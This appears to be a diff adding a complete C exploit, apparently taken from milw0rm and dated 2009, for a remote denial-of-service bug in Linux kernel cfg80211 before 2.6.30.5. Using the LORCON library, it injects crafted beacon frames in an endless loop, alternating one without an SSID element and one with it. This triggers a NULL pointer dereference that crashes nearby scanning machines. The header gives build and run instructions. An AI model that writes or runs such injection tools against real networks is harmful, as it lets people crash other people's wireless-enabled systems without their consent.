@@ -1,0 +1,176 @@
+/*
+ * cfg80211-remote-dos.c
+ *
+ * Linux Kernel < 2.6.30.5 cfg80211 Remote DoS
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ * 
+ * Information:
+ *
+ *   http://patchwork.kernel.org/patch/41218/
+ *
+ *   These pointers can be NULL, the is_mesh() case isn't ever hit in the 
+ *   current kernel, but cmp_ies() can be hit under certain conditions.
+ *
+ * Usage:
+ *
+ *   $ gcc cfg80211-remote-dos.c -o cfg80211-remote-dos -lorcon
+ *   $ airmon-ng start wlan0
+ *   ...
+ *   $ ./cfg80211-remote-dos mon0 mac80211
+ *   [+] Initializing interface mon0...
+ *   [+] Injecting crafted DoS beacon frames...
+ *
+ * Notes:
+ *
+ *   The NULL pointer dereference is triggered if the victim scans and receives
+ *   a beacon frame that does not contain a SSID IE and then receives another 
+ *   one that does have a SSID IE.  Raw frame injection via LORCON is required 
+ *   on the wireless interface.  This should only affect the 2.6.30 series.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <time.h>
+
+#include <tx80211.h>
+#include <tx80211_packet.h>
+
+#define BEACON_NOSSID \
+	"\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff" \
+	"\x00\x03\x52\x00\x00\x00" \
+	"\x00\x03\x52\x00\x00\x00" \
+	"\x30\x4b" \
+	"\x5f\x74\x34\x77\xdb\x03\x00\x00\x64\x00\x21\x04" \
+	"\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24" \
+	"\x03\x01\x07" \
+	"\x05\x04\x00\x01\x01\x00" \
+	"\x2a\x01\x04" \
+	"\x32\x04\x30\x48\x60\x6c"
+#define BEACON_NOSSID_LEN 64
+
+#define BEACON_SSID \
+	"\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff" \
+	"\x00\x03\x52\x00\x00\x00" \
+	"\x00\x03\x52\x00\x00\x00" \
+	"\x30\x4b" \
+	"\x5f\x74\x34\x77\xdb\x03\x00\x00\x64\x00\x21\x04" \
+	"\x00\x03\x44\x6f\x53" \
+	"\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24" \
+	"\x03\x01\x07" \
+	"\x05\x04\x00\x01\x01\x00" \
+	"\x2a\x01\x04" \
+	"\x32\x04\x30\x48\x60\x6c"
+#define BEACON_SSID_LEN 69
+
+void
+usage(char **argv)
+{
+	int i;
+	struct tx80211_cardlist *cardlist;
+
+	printf("Usage: %s [interface] [drivername]\n", argv[0]);
+
+	cardlist = tx80211_getcardlist();
+
+	if (cardlist == NULL) {
+		printf("Error accessing supported cardlist.\n");
+	} else {
+		printf("\nSupported drivers are: ");
+		for (i = 1; i < cardlist->num_cards; i++) {
+			printf("%s ", cardlist->cardnames[i]);
+		}
+		printf("\n");
+	}
+	tx80211_freecardlist(cardlist);
+}
+
+int
+main(int argc, char **argv)
+{
+	struct tx80211 tx;
+	struct tx80211_packet pkt;
+	char p1[BEACON_NOSSID_LEN];
+	char p2[BEACON_SSID_LEN];
+	int ret, drivertype;
+	uint8_t randbyte;
+
+	if (argc < 3) {
+		usage(argv);
+		return 0;
+	}
+
+	printf("[+] Initializing interface %s...\n", argv[1]);
+
+	drivertype = tx80211_resolvecard(argv[2]);
+	if (drivertype == INJ_NODRIVER) {
+		printf("[-] Driver name not recognized.\n");
+		exit(1);
+	}
+
+	ret = tx80211_init(&tx, argv[1], drivertype);
+	if (ret < 0) {
+		printf("[-] Error initializing %s/%s", argv[1], argv[2]);
+		exit(1);
+	}
+
+	ret = tx80211_setfunctionalmode(&tx, TX80211_FUNCMODE_INJMON);
+	if (ret != 0) {
+		printf("[-] Error setting monitor mode.\n");
+		printf("[-] %s.\n", tx80211_geterrstr(&tx));
+		exit(1);
+	}
+
+	ret = tx80211_setchannel(&tx, 11);
+	if (ret < 0) {
+		printf("[-] Error setting channel.\n");
+		printf("[-] %s.\n", tx80211_geterrstr(&tx));
+		exit(1);
+	}
+
+	ret = tx80211_open(&tx);
+	if (ret < 0) {
+		printf("[-] Unable to open interface %s\n", tx.ifname);
+		printf("[-] %s.\n", tx80211_geterrstr(&tx));
+		exit(1);
+	}
+
+	srand(time(NULL));
+
+	memcpy(p1, BEACON_NOSSID, BEACON_NOSSID_LEN);
+	memcpy(p2, BEACON_SSID, BEACON_SSID_LEN);
+	
+	printf("[+] Injecting crafted DoS beacon frames...\n");
+
+	while (1) {
+		randbyte = rand() & 0xff;
+		p1[15] = randbyte;
+		p1[21] = randbyte;
+		p2[15] = randbyte;
+		p2[21] = randbyte;
+
+		pkt.packet = p1;
+		pkt.plen = BEACON_NOSSID_LEN;
+		if (tx80211_txpacket(&tx, &pkt) < 0) {
+			printf("[-] Unable to transmit packet.\n");
+			printf("[-] %s.\n", tx80211_geterrstr(&tx));
+			exit(1);
+		}
+
+		pkt.packet = p2;
+		pkt.plen = BEACON_SSID_LEN;
+		if (tx80211_txpacket(&tx, &pkt) < 0) {
+			printf("[-] Unable to transmit packet.\n");
+			printf("[-] %s.\n", tx80211_geterrstr(&tx));
+			exit(1);
+		}
+	}
+
+	tx80211_close(&tx);
+
+	return 0;
+}
+
+// milw0rm.com [2009-08-18]
